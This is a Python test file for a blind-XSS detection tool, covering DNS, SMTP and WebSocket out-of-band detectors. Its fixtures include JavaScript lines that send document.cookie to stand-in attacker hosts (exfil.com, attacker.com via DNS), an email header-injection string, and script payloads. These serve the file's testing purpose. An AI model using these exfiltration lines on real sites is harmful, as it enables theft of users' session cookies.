"""Tests for advanced OOB (blind XSS) detection modules."""


from xoxss.oob.dns_blind import (
    DNSBlindXSSDetector,
    DNSExfiltrationMethod,
    DNSXSSVulnerability,
)
from xoxss.oob.smtp_blind import (
    SMTPBlindXSSDetector,
    SMTPExfiltrationMethod,
    SMTPXSSVulnerability,
)
from xoxss.oob.websocket_oob import (
    WebSocketExfiltrationMethod,
    WebSocketOOBDetector,
    WebSocketXSSVulnerability,
)


class TestDNSBlindXSS:
    """Test DNS blind XSS detection."""

    def test_generate_dns_payloads(self):
        detector = DNSBlindXSSDetector()
        payloads = detector.generate_dns_payloads("callback.attacker.com", DNSExfiltrationMethod.SUBDOMAIN, "{data}", "marker")
        assert len(payloads) > 0
        assert any("callback.attacker.com" in p for p in payloads)

    def test_detect_dns_exfiltration(self):
        detector = DNSBlindXSSDetector()
        js = "const img = new Image(); img.src = 'http://exfil.com/?c=' + document.cookie"
        vulns = detector.detect_dns_exfiltration(js)
        assert len(vulns) > 0

    def test_check_dns_rebinding(self):
        detector = DNSBlindXSSDetector()
        js = "const host = window.location.hostname"
        assert detector.check_dns_rebinding(js) is True

    def test_scan_returns_vulnerabilities(self):
        detector = DNSBlindXSSDetector()
        js = "fetch('https://dns.google/resolve?name=' + btoa(document.cookie) + '.attacker.com')"
        vulns = detector.scan_for_dns_xss(js, callback_domain="attacker.com", marker="test")
        assert len(vulns) > 0

    def test_assess_dns_risk_critical(self):
        detector = DNSBlindXSSDetector()
        vulns = [
            DNSXSSVulnerability(
                method=DNSExfiltrationMethod.SUBDOMAIN,
                payload="<script>alert(1)</script>",
                callback_domain="test.com",
                severity="high",
                context="test",
            )
        ]
        risk = detector.assess_dns_risk(vulns)
        assert risk == "critical"

    def test_get_dns_summary(self):
        detector = DNSBlindXSSDetector()
        detector._vulnerabilities = [
            DNSXSSVulnerability(
                method=DNSExfiltrationMethod.SUBDOMAIN,
                payload="test",
                callback_domain="test",
                severity="high",
                context="test",
            )
        ]
        summary = detector.get_dns_summary()
        assert summary["total_vulnerabilities"] == 1


class TestSMTPBlindXSS:
    """Test SMTP blind XSS detection."""

    def test_detect_email_forms(self):
        detector = SMTPBlindXSSDetector()
        html = '<form action="/contact"><input type="email" name="email"></form>'
        forms = detector.detect_email_forms(html)
        assert len(forms) > 0

    def test_check_email_header_injection(self):
        detector = SMTPBlindXSSDetector()
        js = "const header = 'To: attacker@evil.com\\nSubject: test\\nContent-Type: text/html'"
        vulns = detector.check_email_header_injection(js)
        assert len(vulns) > 0

    def test_generate_smtp_payloads(self):
        detector = SMTPBlindXSSDetector()
        payloads = detector.generate_smtp_payloads("callback@attacker.com", SMTPExfiltrationMethod.EMAIL_BODY, "marker")
        assert len(payloads) > 0

    def test_scan_returns_vulnerabilities(self):
        detector = SMTPBlindXSSDetector()
        html = '<form action="/contact"><input type="email" name="email"></form>'
        vulns = detector.scan_for_smtp_xss(html, callback_email="test@attacker.com", marker="test")
        assert len(vulns) > 0

    def test_assess_smtp_risk_critical(self):
        detector = SMTPBlindXSSDetector()
        vulns = [
            SMTPXSSVulnerability(
                method=SMTPExfiltrationMethod.EMAIL_BODY,
                payload="<script>alert(1)</script>",
                callback_email="test@attacker.com",
                severity="high",
                context="test",
            )
        ]
        risk = detector.assess_smtp_risk(vulns)
        assert risk == "critical"

    def test_get_smtp_summary(self):
        detector = SMTPBlindXSSDetector()
        detector._vulnerabilities = [
            SMTPXSSVulnerability(
                method=SMTPExfiltrationMethod.EMAIL_BODY,
                payload="test",
                callback_email="test",
                severity="high",
                context="test",
            )
        ]
        summary = detector.get_smtp_summary()
        assert summary["total_vulnerabilities"] == 1


class TestWebSocketOOB:
    """Test WebSocket OOB XSS detection."""

    def test_detect_websocket_sinks(self):
        detector = WebSocketOOBDetector()
        js = "const ws = new WebSocket('wss://example.com'); ws.onmessage = handler"
        sinks = detector.detect_websocket_sinks(js)
        assert WebSocketExfiltrationMethod.FRAME in sinks
        assert WebSocketExfiltrationMethod.MESSAGE in sinks

    def test_check_dangerous_integration(self):
        detector = WebSocketOOBDetector()
        js = "ws.onmessage = (e) => { websocket.innerHTML = e.data; websocket.eval(e.data) }"
        vulns = detector.check_dangerous_integration(js, "marker")
        assert len(vulns) > 0

    def test_check_message_handler_xss(self):
        detector = WebSocketOOBDetector()
        js = "ws.addEventListener('message', (e) => { this.innerHTML = e.data })"
        vulns = detector.check_message_handler_xss(js, "marker")
        assert len(vulns) > 0

    def test_check_frame_injection(self):
        detector = WebSocketOOBDetector()
        js = "ws.send(user_input)"
        vulns = detector.check_frame_injection(js, "marker")
        assert len(vulns) > 0

    def test_scan_returns_vulnerabilities(self):
        detector = WebSocketOOBDetector()
        js = "const ws = new WebSocket('wss://example.com'); ws.onmessage = (e) => { document.body.innerHTML = e.data }"
        vulns = detector.scan_for_websocket_xss(js, callback_url="wss://callback.attacker.com", marker="test")
        assert len(vulns) > 0

    def test_assess_websocket_risk_critical(self):
        detector = WebSocketOOBDetector()
        vulns = [
            WebSocketXSSVulnerability(
                method=WebSocketExfiltrationMethod.MESSAGE,
                payload="<script>alert(1)</script>",
                callback_url="wss://test.com",
                severity="high",
                context="test",
            )
        ]
        risk = detector.assess_websocket_risk(vulns)
        assert risk == "critical"

    def test_get_websocket_summary(self):
        detector = WebSocketOOBDetector()
        detector._vulnerabilities = [
            WebSocketXSSVulnerability(
                method=WebSocketExfiltrationMethod.MESSAGE,
                payload="test",
                callback_url="test",
                severity="high",
                context="test",
            )
        ]
        summary = detector.get_websocket_summary()
        assert summary["total_vulnerabilities"] == 1
